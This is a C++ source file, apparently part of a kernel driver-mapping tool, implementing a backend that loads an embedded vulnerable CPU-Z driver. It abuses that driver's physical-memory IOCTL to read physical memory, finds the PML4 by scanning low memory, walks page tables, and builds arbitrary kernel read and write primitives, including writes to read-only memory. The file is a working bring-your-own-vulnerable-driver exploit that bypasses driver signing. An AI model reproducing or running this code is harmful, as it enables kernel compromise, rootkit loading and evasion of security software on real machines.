#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_CPUZ)

#include "CPUZBackend.h"
#include "../Common/VulnerableDriverLoader.h"
#include "cpuz_sys.h"
#include <algorithm>

namespace
{
	constexpr DWORD CpuzReadPhysicalIoctl = 0x9C402540;
	constexpr ULONG SeLockMemoryPrivilege = 4;
	constexpr ULONG SeLoadDriverPrivilege = 10;
	constexpr size_t PageSize = 0x1000;

	uint64_t SwapAddress( uint64_t value )
	{
		return ( value >> 32 ) | ( value << 32 );
	}
}

std::string CPUZBackend::Name( ) const
{
	return pstra( "CPUZ" );
}

NTSTATUS CPUZBackend::LoadDevice( )
{
	Tools::EnableDebugPrivilege( true );
	NTSTATUS Status = 0;
	BOOLEAN bOldValue = FALSE;
	
	Status = RtlAdjustPrivilege( SE_LOCK_MEMORY_PRIVILEGE, TRUE, FALSE, &bOldValue );

	// STATUS_PRIVILEGE_NOT_HELD
	//if ( Status )
	//{
	//	LOG_SEC( "[-] - [CPUZ] Failed to acquire SeLockMemoryPrivilege Status: 0x%X", Status );
	//	return Status;
	//}

	Status = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &bOldValue );
	if ( Status )
	{
		LOG_SEC( "[-] - [CPUZ] Failed to acquire SeLoadDriverPrivilege Status: 0x%X", Status );
		return Status;
	}

	auto image = Tools::DecodePEBuffer( cpuz_sys, sizeof( cpuz_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\?\\GLOBALROOT\\Device\\cpuz160" ), image.data( ), image.size( ), &m_Device, 0x9192 );
}

NTSTATUS CPUZBackend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( );
}

bool CPUZBackend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = ReadVirtualMemory( address, buffer, size );

	if ( !result )
		LOG_SEC( "[-] - [CPUZ] ReadMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool CPUZBackend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = WriteVirtualMemory( address, buffer, size );

	if ( !result )
		LOG_SEC( "[-] - [CPUZ] WriteMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool CPUZBackend::WriteToReadOnlyMemory( uint64_t address, const void* buffer, size_t size )
{
	return WriteMemory( address, buffer, size );
}

bool CPUZBackend::AcquirePrivilege( ULONG privilege )
{
	using RtlAdjustPrivilegeFn = NTSTATUS( NTAPI* )( ULONG, BOOLEAN, BOOLEAN, PBOOLEAN );

	const auto ntdll = GetModuleHandleW( pstrw( L"ntdll.dll" ) );

	if ( !ntdll )
		return false;

	const auto rtlAdjustPrivilege = r_cast<RtlAdjustPrivilegeFn>( GetProcAddress( ntdll, pstra( "RtlAdjustPrivilege" ) ) );

	if ( !rtlAdjustPrivilege )
		return false;

	BOOLEAN enabled = FALSE;
	const auto status = rtlAdjustPrivilege( privilege, TRUE, FALSE, &enabled );

	if ( NT_SUCCESS( status ) || enabled )
		return true;

	SetLastError( RtlNtStatusToDosError( status ) );
	return false;
}

bool CPUZBackend::ReadPhysicalMemory( uint64_t physicalAddress, void* buffer, size_t size )
{
	if ( !buffer || !size || size > 0xFFFFFFFFull || m_Device == INVALID_HANDLE_VALUE )
		return false;

	PhysicalMemoryRequest request {};
	request.Address = SwapAddress( physicalAddress );
	request.Length = s_cast<ULONG>( size );
	request.Buffer = SwapAddress( r_cast<uint64_t>( buffer ) );

	DWORD bytesReturned = 0;
	return DeviceIoControl( m_Device, CpuzReadPhysicalIoctl, &request, sizeof( request ), &request, sizeof( request ), &bytesReturned, nullptr ) != FALSE;
}

bool CPUZBackend::WriteVirtualMemory( uint64_t virtualAddress, const void* buffer, size_t size )
{
	if ( !virtualAddress || !buffer || !size )
		return false;

	ULONG_PTR pagesCount = ( size + PageSize - 1 ) / PageSize;
	const auto requestedPages = pagesCount;
	auto pagesArray = r_cast<PULONG_PTR>( VirtualAlloc( nullptr, sizeof( ULONG_PTR ) * pagesCount, MEM_COMMIT, PAGE_READWRITE ) );

	if ( !pagesArray )
		return false;

	if ( !AllocateUserPhysicalPages( GetCurrentProcess( ), &pagesCount, pagesArray ) || pagesCount != requestedPages )
	{
		if ( pagesCount )
			FreeUserPhysicalPages( GetCurrentProcess( ), &pagesCount, pagesArray );

		VirtualFree( pagesArray, 0, MEM_RELEASE );
		return false;
	}

	const auto mapSize = pagesCount * PageSize;
	auto mapped = VirtualAlloc( nullptr, mapSize, MEM_RESERVE | MEM_PHYSICAL, PAGE_READWRITE );

	if ( !mapped )
	{
		FreeUserPhysicalPages( GetCurrentProcess( ), &pagesCount, pagesArray );
		VirtualFree( pagesArray, 0, MEM_RELEASE );
		return false;
	}

	if ( !MapUserPhysicalPages( mapped, pagesCount, pagesArray ) )
	{
		VirtualFree( mapped, 0, MEM_RELEASE );
		FreeUserPhysicalPages( GetCurrentProcess( ), &pagesCount, pagesArray );
		VirtualFree( pagesArray, 0, MEM_RELEASE );
		return false;
	}

	RtlCopyMemory( mapped, buffer, size );

	bool result = true;
	size_t offset = 0;

	for ( size_t page = 0; page < pagesCount && offset < size; ++page )
	{
		const auto chunk = std::min<size_t>( PageSize, size - offset );

		if ( !ReadPhysicalMemory( pagesArray[ page ] << 12, r_cast<void*>( virtualAddress + offset ), chunk ) )
		{
			result = false;
			break;
		}

		offset += chunk;
	}

	VirtualFree( mapped, 0, MEM_RELEASE );
	FreeUserPhysicalPages( GetCurrentProcess( ), &pagesCount, pagesArray );
	VirtualFree( pagesArray, 0, MEM_RELEASE );

	return result;
}

bool CPUZBackend::QueryPml4( uint64_t* value )
{
	if ( !value )
		return false;

	*value = 0;

	__try
	{
		for ( uint64_t address = 0; address < 0x100000; address += PageSize )
		{
			uint8_t buffer[ PageSize ] {};

			if ( !ReadPhysicalMemory( address, buffer, sizeof( buffer ) ) )
				continue;

			if ( 0x00000001000600E9 != ( 0xffffffffffff00ff & *r_cast<uint64_t*>( buffer ) ) )
				continue;

			if ( 0xfffff80000000000 != ( 0xfffff80000000003 & *r_cast<uint64_t*>( buffer + 0x70 ) ) )
				continue;

			if ( 0xffffff0000000fff & *r_cast<uint64_t*>( buffer + 0xA0 ) )
				continue;

			*value = *r_cast<uint64_t*>( buffer + 0xA0 );
			LOG_SEC( "[*] - [CPUZ] QueryPml4 found pml4=0x%llx lowStubOffset=0x%llx", *value, address );
			break;
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		LOG_SEC( "[-] - [CPUZ] QueryPml4 exception code=0x%X", GetExceptionCode( ) );
		*value = 0;
	}

	if ( !*value )
		LOG_SEC( "[-] - [CPUZ] QueryPml4 failed to find PML4" );

	return *value != 0;
}

bool CPUZBackend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
{
	constexpr uint64_t EntryPresentBit = 1;
	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;

	if ( entry & EntryPresentBit )
	{
		*physicalAddress = entry & PhysicalAddressMask;
		return true;
	}

	return false;
}

bool CPUZBackend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
	constexpr uint64_t PhysicalAddressMask2MbPages = 0x000fffffffe00000ull;
	constexpr uint64_t VirtualAddressMask2MbPages = 0x00000000001fffffull;
	constexpr uint64_t VirtualAddressMask4KbPages = 0x0000000000000fffull;
	constexpr uint64_t EntryPageSizeBit = 0x0000000000000080ull;

	if ( !physicalAddress )
		return false;

	if ( !m_Pml4 && !QueryPml4( &m_Pml4 ) )
	{
		LOG_SEC( "[-] - [CPUZ] VirtualToPhysical failed QueryPml4 va=0x%llx", virtualAddress );
		return false;
	}

	auto table = m_Pml4 & PhysicalAddressMask;
	uint64_t entry = 0;

	for ( int r = 0; r < 4; r++ )
	{
		const auto shift = 39 - ( r * 9 );
		const auto selector = ( virtualAddress >> shift ) & 0x1ff;

		if ( !ReadPhysicalMemory( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ) ) )
		{
			LOG_SEC( "[-] - [CPUZ] VirtualToPhysical failed read entry va=0x%llx level=%d table=0x%llx selector=0x%llx", virtualAddress, r, table, selector );
			return false;
		}

		if ( !PageEntryToPhysicalAddress( entry, &table ) )
		{
			LOG_SEC( "[-] - [CPUZ] VirtualToPhysical entry not present va=0x%llx level=%d entry=0x%llx", virtualAddress, r, entry );
			return false;
		}

		if ( r == 2 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask2MbPages;
			table += virtualAddress & VirtualAddressMask2MbPages;
			*physicalAddress = table;
			return true;
		}
	}

	table += virtualAddress & VirtualAddressMask4KbPages;
	*physicalAddress = table;
	return true;
}

bool CPUZBackend::ReadVirtualMemory( uint64_t address, void* buffer, size_t size )
{
	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = PageSize - ( currentAddress & 0xFFF );
		const auto chunk = std::min<size_t>( pageLeft, size - offset );

		if ( !VirtualToPhysical( currentAddress, &physical ) )
			return false;

		if ( !ReadPhysicalMemory( physical, bytes + offset, chunk ) )
			return false;

		offset += chunk;
	}

	return true;
}




#endif // KZEROMAPPER_ENABLE_CPUZ
